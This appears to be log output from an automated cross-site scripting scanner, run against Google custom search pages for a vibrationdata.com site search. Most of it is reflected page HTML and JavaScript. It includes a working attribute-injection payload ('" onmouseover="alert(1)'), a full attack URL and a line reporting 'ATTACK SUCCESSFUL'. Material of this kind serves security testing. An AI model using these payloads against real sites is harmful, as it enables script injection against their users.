+var a=m;window.W_jd=window.W_jd||{};for(var b=0;b<a.length;b+=2)window.W_jd[a[b]]=JSON.parse(a[b+1]);})();(function(){window.WIZ_global_data={"Yllh3e":"%.@.1586779423101915,104391631,1342333488]\n","zChJod":"%.@.]\n","pxO4Zd":"0","GWsdKe":"en-PK","SIsrTd":"false","LU5fGb":"false","w2btAe":"%.@.\"\",\"\",\"0\",null,null,null,1]\n","eptZe":"/_/WizRpcUi/","mXOY5d":"%.@.null,1]\n","fyLpDc":"","SsQ4x":"2IKMQ4NgragGIHCFqm5z9w\u003d\u003d","WWz0vd":"false","QDXUyc":"#188038","v44rSc":"#70757a","IfHuyb":"rgba(0,0,0,.54)","rX9Pnb":"16","j0DpSe":"false","MiTaT":"#1A73E8","wB1JTc":"false","BW8dtd":"rgba(248, 248, 248, 1)","bVUXme":"25","buGAI":"16","QA73ad":"false","s6Rzec":"0 16px","qj36Ef":"#323232","UnFEre":"16","L6WyEf":"true","U6xP0":"#4285f4","WMBRj":"#009688","iKzRxb":"#5f6368","RJegIe":"#fffff0","JVBnre":"false","GTYTQ":"#ffeb3b","PngPbb":"rgba(0,0,0,.87)","AQEr7b":"#c6c6c6","NW4nA":"rgba(255,255,255,.7)","iryGqc":"2","xT28q":"false","aKuscd":"#AECBFA","iniaFd":"true","gjAni":"#3c4043","wlwuHd":"false","S1ZUDf":"true","z1x4kc":"true","W445Dc":"20","A2aVpb":"50","EgTnfe":"true","fRkoq":"true","qkXvHd":"500","kVbEH":"false","OjG6Qc":"#000","HWmJg":"#dcdcdc","haqSDf":"rgba(0,0,0,.54)","tpLZye":"#fff","KVmtZc":"rgba(255,255,255,.3)","pPtK5":"6","KnXmRc":"10","SATNMc":"1px solid #dfe1e5","VnH1Zb":"normal","QldWK":"6","TKn0F":"20px","tqmosb":"#fff","eE52Jd":"#5f6368","X1bUEc":"arial,sans-serif-medium,sans-serif","X4DPRd":"true","aUt4Tc":"false","Hzi6pf":"#DFE1E5","a7rhWc":"false","g635Ab":"2px","HjM8R":"#FFF","bmQ7Rb":"false","Rnt1Qc":"false","qDYzS":"0 2px 10px 0 rgba(0,0,0,0.2)","By1ejd":"16","voc95c":"false","vIMrp":"true","kePaAc":"-4","X4yPd":"#1c3aa9","xBx7Dc":"36","yFVHo":"true","T1V3fc":"#f4b400","IvNqzc":"true","owXwYb":"#f8f8f8","n1Whrf":"false","SidP2e":"rgba(248, 248, 248, 0)","Utapxe":"-webkit-","auaxA":"#222","xz9C5b":"true","KD9WYe":"#1A73E8","e2p8ee":"false","abZ6pc":"#f9a825","zhBJde":"false","kvKIW":"false","u4NTBb":"40","q7vEEb":"false","F4ULTd":"true","ue6nDb":"Roboto-Medium,Roboto-Regular","dAFa0e":"false","bmAEG":"#d9d9d9","LIYDac":"arial,sans-serif","FYBlgf":"false","iwHJId":"15","dTMnbc":"false","y519we":"true","xvI8we":"#212121","RZ03Ve":"#5677fc","osNyZ":"1.0","AYXCHc":"false","EuCkcd":"16","rx1dvd":"#f3f3f3","SfSmD":"#ebebeb","ConpTc":"false","gqXETb":"#db4437","FF58Bf":"true","JpB3Ue":"60","kkVYtc":"false","MoAfyf":"#fff","pxDH4c":"#0f9d58","oFa0q":"#fafafa","j9ZYRc":"true","Nk1Bhf":"#4285f4","xeVOLe":"#689f38","h29koe":"32","PIn0Ab":"1px solid #DFE1E5","oyB9kf":"rgba(0,0,0,.87)","ruHO7c":"#dd191d","KgXmrd":"true","A5tF3b":"false","JRGsye":"none","o07h3e":"0 4px 5px rgba(0,0,0,.16)","rWPbFe":"rgba(255,255,255,1)","ToXxme":"#e5e5e5","QnH6ad":"16","rRLesf":"0","SpZHZd":"true","K2vQjf":"#f8f8f8","MOPyub":"15","gir54":"0.4","prFQBe":"#ebebeb","sBpVac":"rgba(0,0,0,.26)","KFdH8":"true","srQSvc":"true","mJempe":"13","ZzVVh":"false","o9mzkf":"false","b1KZw":"#fff","BoqNoc":"20px","lzJv9d":"#fff","ppkaeb":"0","eo8dye":"#878787","Vdtb3d":"true","PuOePe":"false","ENmP1c":"rgba(204,204,204,.15)","eXPt4e":"400","eGDqv":"false","Na6wt":"#e1e1e1","rZYUef":"#f5f5f5","FydCC":"true","N31mf":"false","rsd6be":"1","VXIo7d":"8px","BwgO5":"16","fQC6Cf":"2px","y1HZEd":"false","ekXXzb":"13px","pLhKvc":"0","OqjdAf":"true","o28sBd":"false","YWHUvb":"18px","ib0wve":"rgba(153,153,153,.2)","imHXAf":"true","BdVmgf":"16","uRoR4d":"false","XgWQKd":"true","EJG4vf":"pointer","KdGe5c":"false","fFepd":"-15","TUhOL":"#fafafa","bDOvJc":"false","OQZvxe":"0 2px 10px 0 rgba(0,0,0,0.2)","I69zkb":"rgba(204,204,204,.25)","AP8pqf":"rgba(0,0,0,.12)","kL6Xwb":"false","hgWJ8c":"false","QSF9Ec":"","WnrBce":"rgba(0,0,0,.1)","fjc61":"false","p7BdKe":"true","LnZAkd":"false","UduJSb":"%.@.\"0 0\",0,0,20,20,\"/images/searchbox/desktop_searchbox_sprites302_hr.png\",\"20px\"]\n","BYw9f":"false","a8Umdd":"rgba(153,153,153,.4)","PYrjqe":"40","y2Hs7d":"false","ZxI7Af":"#fafafa","in3Ilb":"#222","seVajd":"rgba(0,0,0,.12)","Vzh4p":"0px 7px 6px -5px #DFE1E5","H7aRye":"0px 5px 26px 0px rgba(0, 0, 0, 0.22), 0px 20px 28px 0px rgba(0, 0, 0, 0.30)","tyCgpc":"#fff","NvsKMd":"true","NIYCKf":"28","FiZWae":"32","EqX55c":"652","UNVSy":"false","nMRhJe":"false","B0husb":"true","klgere":"invert(1) hue-rotate(180deg)","R9GQh":"#fff","ZLr84e":"true","khoEPb":"#1a0dab","jIrJIf":"14","lVRwic":"false","ODgkgd":"#fff","zHtpPb":"false","AYVQWe":"20px","VQfWj":"#c0c0c0","Mlljec":"false","hbfefd":"#1A73E8","PPUcAe":"0px 0px 8px rgba(32, 33, 36, .24)","i7mh3e":"16","xFbXr":"rgba(0,102,33,1)","qmiCId":"true","pDiOce":"false","GzC2p":"#fff","lLCPB":"true","k7G1xb":"15","hqg9c":"#1878f0","S7nbec":"16","V6eh7c":"16","D8A8he":"true","Tae7A":"true","JcUGee":"rgba(0,0,0,.54)","wFGKdc":"false","SezQgf":"500","cdRSXc":"false","PxA5sf":"rgba(0,0,0,.54)","SuQiSc":"1.3","VbmVYd":"true","z70S0c":"false","FbN3Qc":"rgba(0,0,0,.87)","AEMHld":"#eeeeee","V0Bluc":"none","Ym5Ycb":"false","Fcb4A":"#1A73E8","aD6AQe":"#757575","tqXjO":"false","pch72b":"false","hWyTvf":"false","tuTJ6d":"#b8b8b8","vhCwfc":"false","WyvaRd":"0 1px 1px rgba(0,0,0,.16)","Sgnmlc":"14px","jg5SCd":"false","gbf9Eb":"58","wku5sd":"false","ZMFELd":"false","Dc0uuf":"16","sPiebd":"false","xDKXr":"false","WxHUzd":"true","JyBo2c":"false","EiEfXb":"#ebebeb","tJ4Jdf":"11","YXGVrd":"true","ymIfqf":"18","AwPxw":"false","umYEvb":"false","KTkDB":"false","iDTSkb":"true","RpI44b":"#ebebeb","B8Dib":"rgba(0,0,0,.87)","bXvyY":"#fff","zhkRO":"%.@.1,1,1,1,1,1,0,0,0,0]\n","LACYrf":"false"};window.IJ_values=["#fff","rgba(0,102,33,1)","rgba(0,0,0,.87)","rgba(0,0,0,.54)","rgba(255,255,255,1)","rgba(255,255,255,.7)",false,"%.@.\"\",\"\",\"0\",null,null,null,1]\n","0","%.@.null,1]\n","%.@.]\n","2IKMQ4NgragGIHCFqm5z9w\u003d\u003d","%.@.\"0 0\",0,0,20,20,\"/images/searchbox/desktop_searchbox_sprites302_hr.png\",\"20px\"]\n","en-PK",false,"","%.@.1586779423101915,104391631,1342333488]\n",false,"/_/WizRpcUi/"];})();google.x(null, function(){(function(){(function(){google.csct={};google.csct.ps='AOvVaw2hqWprG-h6OlsTf5JpuVLG\x26ust\x3d1586865823163751';})();})();(function(){(function(){google.csct.pi=true;})();})();(function(){(function(){
+function f(){for(var c="&cshid="+google.cshid,d=document.querySelectorAll('[href^="/"]'),e=0,b;b=d[e++];){var a=b.getAttribute("href");a.match(/[\?|&](ei|ved)=/)&&-1==a.indexOf("cshid=")&&(-1==a.search("#")?b.setAttribute("href",a+c):(a=a.split("#"),b.setAttribute("href",a[0]+c+"#"+a[1])))}d=document.querySelectorAll("[ping]");for(e=0;b=d[e++];)a=b.getAttribute("ping"),-1==a.indexOf("cshid=")&&b.setAttribute("ping",a+c)};google.csh=google.csh||{};google.csh.ict=function(c){google.cshid&&(c&&window.MutationObserver?google.dclc(function(){(new MutationObserver(f)).observe(document.querySelector("body"),{attributes:!0,childList:!0,subtree:!0,characterData:!0})}):google.dclc(f))};}).call(this);})();(function(){(function(){var umo=false;google.csh.ict(umo);})();})();(function(){window.jsl=window.jsl||{};window.jsl.dh=window.jsl.dh||function(i,c,d){try{var e=document.getElementById(i);if(e){e.innerHTML=c;if(d){d();}}else{if(window.jsl.el){window.jsl.el(new Error('Missing ID.'),{'id':i});}}}catch(e){if(window.jsl.el){window.jsl.el(new Error('jsl.dh'));}}};})();(function(){window.jsl.dh('hdtbMenus','\x3cdiv class\x3d\x22hdtb-mn-cont\x22\x3e\x3cdiv id\x3d\x22XJDHvf\x22\x3e\x3c/div\x3e\x3cdiv class\x3d\x22hdtb-mn-hd\x22 aria-haspopup\x3d\x22true\x22 role\x3d\x22button\x22 tabindex\x3d\x220\x22\x3e\x3cdiv class\x3d\x22mn-hd-txt\x22\x3eAny time\x3c/div\x3e\x3cspan class\x3d\x22mn-dwn-arw\x22\x3e\x3c/span\x3e\x3c/div\x3e\x3cul class\x3d\x22hdtbU hdtb-mn-c\x22\x3e\x3cli class\x3d\x22hdtbItm hdtbSel\x22 id\x3d\x22qdr_\x22 tabindex\x3d\x220\x22\x3eAny time\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22qdr_h\x22\x3e\x3ca class\x3d\x22q qs\x22 href\x3d\x22/search?q\x3d(uvw%22xyz%27yxz%3C/zxy+site:www.vibrationdata.com\x26amp;safe\x3dactive\x26amp;client\x3dpub-1751731975287442\x26amp;domains\x3dwww.vibrationdata.com\x26amp;oe\x3dISO-8859-1\x26amp;source\x3dlnt\x26amp;tbs\x3dqdr:h\x26amp;sa\x3dX\x26amp;ved\x3d2ahUKEwjbp-f-reXoAhXP4zgGHTBiAlAQpwV6BAgBEBY\x22\x3ePast hour\x3c/a\x3e\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22qdr_d\x22\x3e\x3ca class\x3d\x22q qs\x22 href\x3d\x22/search?q\x3d(uvw%22xyz%27yxz%3C/zxy+site:www.vibrationdata.com\x26amp;safe\x3dactive\x26amp;client\x3dpub-1751731975287442\x26amp;domains\x3dwww.vibrationdata.com\x26amp;oe\x3dISO-8859-1\x26amp;source\x3dlnt\x26amp;tbs\x3dqdr:d\x26amp;sa\x3dX\x26amp;ved\x3d2ahUKEwjbp-f-reXoAhXP4zgGHTBiAlAQpwV6BAgBEBc\x22\x3ePast 24 hours\x3c/a\x3e\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22qdr_w\x22\x3e\x3ca class\x3d\x22q qs\x22 href\x3d\x22/search?q\x3d(uvw%22xyz%27yxz%3C/zxy+site:www.vibrationdata.com\x26amp;safe\x3dactive\x26amp;client\x3dpub-1751731975287442\x26amp;domains\x3dwww.vibrationdata.com\x26amp;oe\x3dISO-8859-1\x26amp;source\x3dlnt\x26amp;tbs\x3dqdr:w\x26amp;sa\x3dX\x26amp;ved\x3d2ahUKEwjbp-f-reXoAhXP4zgGHTBiAlAQpwV6BAgBEBg\x22\x3ePast week\x3c/a\x3e\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22qdr_m\x22\x3e\x3ca class\x3d\x22q qs\x22 href\x3d\x22/search?q\x3d(uvw%22xyz%27yxz%3C/zxy+site:www.vibrationdata.com\x26amp;safe\x3dactive\x26amp;client\x3dpub-1751731975287442\x26amp;domains\x3dwww.vibrationdata.com\x26amp;oe\x3dISO-8859-1\x26amp;source\x3dlnt\x26amp;tbs\x3dqdr:m\x26amp;sa\x3dX\x26amp;ved\x3d2ahUKEwjbp-f-reXoAhXP4zgGHTBiAlAQpwV6BAgBEBk\x22\x3ePast month\x3c/a\x3e\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22qdr_y\x22\x3e\x3ca class\x3d\x22q qs\x22 href\x3d\x22/search?q\x3d(uvw%22xyz%27yxz%3C/zxy+site:www.vibrationdata.com\x26amp;safe\x3dactive\x26amp;client\x3dpub-1751731975287442\x26amp;domains\x3dwww.vibrationdata.com\x26amp;oe\x3dISO-8859-1\x26amp;source\x3dlnt\x26amp;tbs\x3dqdr:y\x26amp;sa\x3dX\x26amp;ved\x3d2ahUKEwjbp-f-reXoAhXP4zgGHTBiAlAQpwV6BAgBEBo\x22\x3ePast year\x3c/a\x3e\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22vjyzWd\x22\x3e\x3cdiv jscontroller\x3d\x22Uuupec\x22 data-m\x3d\x22true\x22\x3e\x3cspan class\x3d\x22q\x22 id\x3d\x22cdrlnk\x22 tabindex\x3d\x220\x22 jsaction\x3d\x22EEGHee\x22 data-ved\x3d\x222ahUKEwjbp-f-reXoAhXP4zgGHTBiAlAQpwV6BAgBEBs\x22\x3eCustom range...\x3c/span\x3e\x3cdiv class\x3d\x22n5Ug4b\x22 style\x3d\x22display:none\x22\x3e\x3cdiv class\x3d\x22vOvh1b\x22 jsaction\x3d\x22xp3IKd\x22\x3e\x3c/div\x3e\x3cdiv class\x3d\x22J6UZg\x22\x3e\x3cdiv class\x3d\x22Jy9Ore\x22\x3eCustomised date range\x3c/div\x3e\x3clabel class\x3d\x22Qtsmnf tmDYm\x22 for\x3d\x22OouJcb\x22\x3eFrom\x3c/label\x3e\x3clabel class\x3d\x22Qtsmnf iWBKNe\x22 for\x3d\x22rzG2be\x22\x3eTo\x3c/label\x3e\x3cdiv class\x3d\x22Gwgzqd\x22 role\x3d\x22button\x22 tabindex\x3d\x220\x22 jsaction\x3d\x22xp3IKd\x22\x3e\x3c/div\x3e\x3cdiv class\x3d\x22NwEGxd\x22\x3e\x3cdiv class\x3d\x22qomYCd\x22\x3e\x3c/div\x3e\x3cform action\x3d\x22/search\x22 class\x3d\x22T3kYXe\x22 method\x3d\x22get\x22\x3e\x3cinput name\x3d\x22q\x22 value\x3d\x27(uvw\x22xyz\x26#39;yxz\x26lt;/zxy site:www.vibrationdata.com\x27 type\x3d\x22hidden\x22\x3e\x3cinput name\x3d\x22safe\x22 value\x3d\x22active\x22 type\x3d\x22hidden\x22\x3e\x3cinput name\x3d\x22client\x22 value\x3d\x22pub-1751731975287442\x22 type\x3d\x22hidden\x22\x3e\x3cinput name\x3d\x22domains\x22 value\x3d\x22www.vibrationdata.com\x22 type\x3d\x22hidden\x22\x3e\x3cinput name\x3d\x22ie\x22 value\x3d\x22ISO-8859-1\x22 type\x3d\x22hidden\x22\x3e\x3cinput name\x3d\x22oe\x22 value\x3d\x22ISO-8859-1\x22 type\x3d\x22hidden\x22\x3e\x3cinput name\x3d\x22source\x22 type\x3d\x22hidden\x22 value\x3d\x22lnt\x22\x3e\x3cinput value\x3d\x22cdr:1,cd_min:x,cd_max:x\x22 id\x3d\x22HjtPBb\x22 name\x3d\x22tbs\x22 type\x3d\x22hidden\x22\x3e\x3cinput value\x3d\x22\x22 name\x3d\x22tbm\x22 type\x3d\x22hidden\x22\x3e\x3cinput class\x3d\x22OouJcb ktf mini\x22 type\x3d\x22text\x22 value\x3d\x22\x22 autocomplete\x3d\x22off\x22 id\x3d\x22OouJcb\x22 tabindex\x3d\x220\x22 jsaction\x3d\x22focus:daRB0b\x22\x3e\x3cinput class\x3d\x22rzG2be ktf mini\x22 type\x3d\x22text\x22 value\x3d\x22\x22 autocomplete\x3d\x22off\x22 id\x3d\x22rzG2be\x22 tabindex\x3d\x220\x22 jsaction\x3d\x22focus:daRB0b\x22\x3e\x3cinput class\x3d\x22Ru1Ao ksb mini\x22 value\x3d\x22Go\x22 tabindex\x3d\x220\x22 type\x3d\x22submit\x22 jsaction\x3d\x22tnv.scf\x22\x3e\x3c/form\x3e\x3c/div\x3e\x3c/div\x3e\x3c/div\x3e\x3c/div\x3e\x3c/li\x3e\x3c/ul\x3e\x3cspan class\x3d\x22hQKUmb\x22\x3e\x3c/span\x3e\x3cdiv class\x3d\x22hdtb-mn-hd\x22 aria-haspopup\x3d\x22true\x22 role\x3d\x22button\x22 tabindex\x3d\x220\x22\x3e\x3cdiv class\x3d\x22mn-hd-txt\x22\x3eAll results\x3c/div\x3e\x3cspan class\x3d\x22mn-dwn-arw\x22\x3e\x3c/span\x3e\x3c/div\x3e\x3cul class\x3d\x22hdtbU hdtb-mn-c\x22\x3e\x3cli class\x3d\x22hdtbItm hdtbSel\x22 id\x3d\x22li_\x22 tabindex\x3d\x220\x22\x3eAll results\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22li_1\x22\x3e\x3ca class\x3d\x22q qs\x22 href\x3d\x22/search?q\x3d(uvw%22xyz%27yxz%3C/zxy+site:www.vibrationdata.com\x26amp;safe\x3dactive\x26amp;client\x3dpub-1751731975287442\x26amp;domains\x3dwww.vibrationdata.com\x26amp;oe\x3dISO-8859-1\x26amp;source\x3dlnt\x26amp;tbs\x3dli:1\x26amp;sa\x3dX\x26amp;ved\x3d2ahUKEwjbp-f-reXoAhXP4zgGHTBiAlAQpwV6BAgBEB4\x22\x3eVerbatim\x3c/a\x3e\x3c/li\x3e\x3c/ul\x3e\x3cspan class\x3d\x22hQKUmb\x22\x3e\x3c/span\x3e\x3c/div\x3e');})();(function(){google.drty&&google.drty();})();});</script>
+
+----------------------------------------------------------------------------------
+URI Context: [13]
+<a href="/search?q=(uvw%22xyz%27yxz%3C/zxy+site:www.vibrationdata.com&amp;safe=active&amp;client=pub-1751731975287442&amp;domains=www.vibrationdata.com&amp;oe=ISO-8859-1&amp;gbv=1&amp;sei=H1WUXpucBs_H4-EPsMSJgAU">
+<a class="gb_4 gb_5 gb_he gb_1c" href="https://accounts.google.com/ServiceLogin?hl=en&amp;passive=true&amp;continue=https://www.google.com/search%3Fdomains%3Dwww.vibrationdata.com%26q%3D(uvw%2522xyz%27yxz%253C/zxy%26sitesearch%3Dwww.vibrationdata.com%26client%3Dpub-1751731975287442%26forid%3D1%26ie%3DISO-8859-1%26oe%3DISO-8859-1%26safe%3Dactive%26cof%3DGALT:" target="_top">
+<a class="q qs" href="/search?q=(uvw%22xyz%27yxz%3C/zxy+site:www.vibrationdata.com&amp;safe=active&amp;client=pub-1751731975287442&amp;domains=www.vibrationdata.com&amp;oe=ISO-8859-1&amp;source=lnms&amp;tbm=isch&amp;sa=X&amp;ved=2ahUKEwjbp-f-reXoAhXP4zgGHTBiAlAQ_AUoAXoECAEQAw">
+<a class="q qs" href="/search?q=(uvw%22xyz%27yxz%3C/zxy+site:www.vibrationdata.com&amp;safe=active&amp;client=pub-1751731975287442&amp;domains=www.vibrationdata.com&amp;oe=ISO-8859-1&amp;source=lnms&amp;tbm=vid&amp;sa=X&amp;ved=2ahUKEwjbp-f-reXoAhXP4zgGHTBiAlAQ_AUoAnoECAEQBA">
+<a class="q qs" href="/search?q=(uvw%22xyz%27yxz%3C/zxy+site:www.vibrationdata.com&amp;safe=active&amp;client=pub-1751731975287442&amp;domains=www.vibrationdata.com&amp;oe=ISO-8859-1&amp;source=lnms&amp;tbm=nws&amp;sa=X&amp;ved=2ahUKEwjbp-f-reXoAhXP4zgGHTBiAlAQ_AUoA3oECAEQBQ">
+<a class="f9UGee q qs" jsaction="mouseover:sbHm2b" role="menuitem" tabindex="-1" href="/search?q=(uvw%22xyz%27yxz%3C/zxy+site:www.vibrationdata.com&amp;safe=active&amp;client=pub-1751731975287442&amp;domains=www.vibrationdata.com&amp;oe=ISO-8859-1&amp;source=lnms&amp;tbm=bks&amp;sa=X&amp;ved=2ahUKEwjbp-f-reXoAhXP4zgGHTBiAlAQ_AUoAHoECAEQBw">
+<a class="f9UGee q qs" jsaction="mouseover:sbHm2b" role="menuitem" tabindex="-1" href="/search?q=(uvw%22xyz%27yxz%3C/zxy+site:www.vibrationdata.com&amp;safe=active&amp;client=pub-1751731975287442&amp;domains=www.vibrationdata.com&amp;oe=ISO-8859-1&amp;source=lnms&amp;tbm=fin&amp;sa=X&amp;ved=2ahUKEwjbp-f-reXoAhXP4zgGHTBiAlAQ_AUoAXoECAEQCA">
+<a href="/preferences?hl=en&amp;prev=https://www.google.com/search?domains%3Dwww.vibrationdata.com%26q%3D(uvw%2522xyz%2527yxz%253C/zxy%26sitesearch%3Dwww.vibrationdata.com%26client%3Dpub-1751731975287442%26ie%3DISO-8859-1%26oe%3DISO-8859-1%26safe%3Dactive%26cof%3DGALT:" class="f9UGee" jsaction="mouseover:sbHm2b" role="menuitem" tabindex="-1" data-ved="2ahUKEwjbp-f-reXoAhXP4zgGHTBiAlAQo_oBegQIARAK">
+<a href="/preferences?hl=en&amp;prev=https://www.google.com/search?domains%3Dwww.vibrationdata.com%26q%3D(uvw%2522xyz%2527yxz%253C/zxy%26sitesearch%3Dwww.vibrationdata.com%26client%3Dpub-1751731975287442%26ie%3DISO-8859-1%26oe%3DISO-8859-1%26safe%3Dactive%26cof%3DGALT:#languages" class="f9UGee" jsaction="mouseover:sbHm2b" role="menuitem" tabindex="-1" data-ved="2ahUKEwjbp-f-reXoAhXP4zgGHTBiAlAQo_oBegQIARAL">
+<a class="f9UGee" jsaction="mouseover:sbHm2b" role="menuitem" tabindex="-1" data-safesearch-on="1" href="/setprefs?safeui=images&amp;sig=0_5e0s2ad9uaTkbXn-L_OU-D5MJWc%3D&amp;prev=https://www.google.com/search?domains%3Dwww.vibrationdata.com%26q%3D(uvw%2522xyz%2527yxz%253C/zxy%26sitesearch%3Dwww.vibrationdata.com%26client%3Dpub-1751731975287442%26ie%3DISO-8859-1%26oe%3DISO-8859-1%26safe%3Dactive%26cof%3DGALT:" id="safesearch" data-ved="2ahUKEwjbp-f-reXoAhXP4zgGHTBiAlAQo_oBegQIARAM">
+<a href="/advanced_search?q=(uvw%22xyz'yxz%3C/zxy+site:www.vibrationdata.com&amp;safe=active&amp;client=pub-1751731975287442&amp;domains=www.vibrationdata.com&amp;oe=ISO-8859-1&amp;hl=en" class="f9UGee" jsaction="mouseover:sbHm2b" role="menuitem" tabindex="-1" data-ved="2ahUKEwjbp-f-reXoAhXP4zgGHTBiAlAQo_oBegQIARAN">
+<a href="/setprefs?safeui=images&amp;sig=0_5e0s2ad9uaTkbXn-L_OU-D5MJWc%3D&amp;prev=https://www.google.com/search?domains%3Dwww.vibrationdata.com%26q%3D(uvw%2522xyz%2527yxz%253C/zxy%26sitesearch%3Dwww.vibrationdata.com%26client%3Dpub-1751731975287442%26ie%3DISO-8859-1%26oe%3DISO-8859-1%26safe%3Dactive%26cof%3DGALT:">
+<meta content="0;url=/search?q=(uvw%22xyz%27yxz%3C/zxy+site:www.vibrationdata.com&amp;safe=active&amp;client=pub-1751731975287442&amp;domains=www.vibrationdata.com&amp;oe=ISO-8859-1&amp;gbv=1&amp;sei=H1WUXpucBs_H4-EPsMSJgAU" http-equiv="refresh">
+
+----------------------------------------------------------------------------------
+
+
+ENCODING     Presence	"	'	<	( 
+ATTR:		True	False	True	True	False
+
+Attack Payloads for ATTR
+['" onmouseover="alert(1)']
+
+ATTR Attack Url: http://www.google.com/custom?domains=www.vibrationdata.com&q=" onmouseover="alert(1)&sitesearch=www.vibrationdata.com&client=pub-1751731975287442&forid=1&ie=ISO-8859-1&oe=ISO-8859-1&safe=active&cof=GALT:#008000;GL:1;DIV:#336699;VLC:663399;AH:center;BGC:FFFFFF;LBGC:336699;ALC:0000FF;LC:0000FF;T:000000;GFNT:0000FF;GIMP:0000FF;FORID:1;&hl=en
+
+=> ATTACK SUCCESSFUL with Payload: " onmouseover="alert(1)
+Detection of Payload: 
+<input class="gLFyf gsfi" maxlength="2048" name="q" type="text" jsaction="paste:puy29d" aria-autocomplete="both" aria-haspopup="false" autocapitalize="off" autocomplete="off" autocorrect="off" role="combobox" spellcheck="false" title="Search" value='" onmouseover="alert(1) site:www.vibrationdata.com' aria-label="Search" data-ved="0ahUKEwi66faAruXoAhVEwjgGHaZYDDgQ39UDCAk">
+ENCODING     Presence	"	'	<	( 
+ATTR:		True	True	True	True	True
+
+Attack Payloads for ATTR
+[]
+ENCODING     Presence	"	'	<	( 
+HTML:		True	False	False	True	False
+
+Attack Payloads for HTML
+[]
+ENCODING     Presence	"	'	<	( 
+HTML:		True	True	True	True	False
+
+Attack Payloads for HTML
+[]
+ENCODING     Presence	"	'	<	( 
+SCRIPT:		True	True	True	True	False
+
+Attack Payloads for SCRIPT
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+_______________________________________________________________________________________________________
+http://www.google.com/custom?domains=www.vibrationdata.com&q=&sitesearch=(uvw"xyz'yxz</zxy&client=pub-1751731975287442&forid=1&ie=ISO-8859-1&oe=ISO-8859-1&safe=active&cof=GALT:#008000;GL:1;DIV:#336699;VLC:663399;AH:center;BGC:FFFFFF;LBGC:336699;ALC:0000FF;LC:0000FF;T:000000;GFNT:0000FF;GIMP:0000FF;FORID:1;&hl=en
+
+----------------------------------------------------------------------------------
+Attribute Context: [2]
+<input class="gLFyf gsfi" maxlength="2048" name="q" type="text" jsaction="paste:puy29d" aria-autocomplete="both" aria-haspopup="false" autocapitalize="off" autocomplete="off" autocorrect="off" role="combobox" spellcheck="false" title="Search" value="site:(uvw%22xyz%27yxz%3C/zxy" aria-label="Search" data-ved="0ahUKEwi2vPqBruXoAhUMyDgGHcTDDdkQ39UDCAk">
+<div jsdata="GXYZuf;;AK9Hrs" jscontroller="G3eKy" jsl="$t t-w-XilABeKRA;$x 0;" class="r-iw6RWyb2TO8g">
+
+----------------------------------------------------------------------------------
+HTML Context: [3]
+<title>site:(uvw%22xyz%27yxz%3C/zxy - Google Search</title>
+<b>(uvw%22xyz%27yxz%3C/zxy</b>
+<em>site:(uvw%22xyz%27yxz%3C/zxy</em>
+
+----------------------------------------------------------------------------------
+Script Context: [1]
+<script nonce="j9M8nchnLxoNoNihRFNSsQ==">(function(){google.ldi={};google.pim={};})();(function(){var u='/xjs/_/js/k\x3dxjs.s.en_GB.YlbWwcv8Rzo.O/ck\x3dxjs.s._psGpbc7COU.L.W.O/m\x3dFkg7bd,HcFEGb,IvlUe,MC8mtf,OF7gzc,RMhBfe,T4BAC,TJw5qb,TbaHGc,Y33vzc,ZyRBae,cdos,hsm,iDPoPb,jsa,mvYTse,tg8oTe,uz938c,vWNDde,ws9Tlc,yQ43ff,d,csi/am\x3dAAQAAMASgF13AJz_TQAAF8w4AAAggBvBxgIpIqEgAAGsuggCAQ/d\x3d1/dg\x3d2/ct\x3dzgms/rs\x3dACT90oGH5qsv6t9wsw0xPVUy40iHVnuuOQ';
+setTimeout(function(){var b=document;var a="SCRIPT";"application/xhtml+xml"===b.contentType&&(a=a.toLowerCase());a=b.createElement(a);a.src=u;google.timers&&google.timers.load&&google.tick&&google.tick("load","xjsls");document.body.appendChild(a)},0);})();(function(){window.google.xjsu='/xjs/_/js/k\x3dxjs.s.en_GB.YlbWwcv8Rzo.O/ck\x3dxjs.s._psGpbc7COU.L.W.O/m\x3dFkg7bd,HcFEGb,IvlUe,MC8mtf,OF7gzc,RMhBfe,T4BAC,TJw5qb,TbaHGc,Y33vzc,ZyRBae,cdos,hsm,iDPoPb,jsa,mvYTse,tg8oTe,uz938c,vWNDde,ws9Tlc,yQ43ff,d,csi/am\x3dAAQAAMASgF13AJz_TQAAF8w4AAAggBvBxgIpIqEgAAGsuggCAQ/d\x3d1/dg\x3d2/ct\x3dzgms/rs\x3dACT90oGH5qsv6t9wsw0xPVUy40iHVnuuOQ';})();function _DumpException(e){throw e;}
+function _F_installCss(c){}
